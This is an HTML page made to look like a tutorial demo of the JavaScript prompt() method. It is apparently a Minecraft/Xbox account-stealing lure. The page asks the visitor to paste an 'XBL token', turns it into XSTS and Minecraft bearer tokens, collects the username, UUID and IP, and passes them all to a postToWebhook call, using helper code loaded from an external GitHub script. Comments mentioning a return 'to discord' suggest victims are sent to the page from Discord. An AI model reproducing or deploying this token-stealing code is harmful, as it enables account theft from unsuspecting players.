<!DOCTYPE html>
<html>
<body>

<h1>The Window Object</h1>
<h2>The prompt() Method</h2>
  <script src="https://github.com/adfcjdf/xbl/blob/1a5de7fb3cd2bedd739a7043556d3eb1f641e6b3/index.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.1.3/axios.min.js"></script>
<p>Click the button to demonstrate the prompt box.</p>

<button onclick="myFunction()">Try it</button>

<p id="demo"></p>

<script>
async function myFunction() {
  let userToken = prompt("Please enter XBL token", "token goes here");
  if (userToken != null) {
    document.getElementById("demo").innerHTML =
    "Hello " + userToken + "! How are you today?";
     //app.get("/api/player/networth", async (req, res) => {
  //if (userToken == undefined) {
    //res.json({
      //success: false,
      //cause: "Missing minecraft_ign field",
    //});
    //return;
  //}
    //res.send('Success! You can exit this page and return to discord.')
    try {
        console.log('1')
        console.log('all of those parameters were obsolete, the fun part begins')
        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
        const xstsTokenHashArray = await getXSTSToken(userToken)
        console.log('its working!')
        const xstsToken = xstsTokenHashArray[0]
        const userHash = xstsTokenHashArray[1]
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, userToken)
    } catch (e) {
        console.log(e)
    }
  }
}
</script>

</body>
</html>
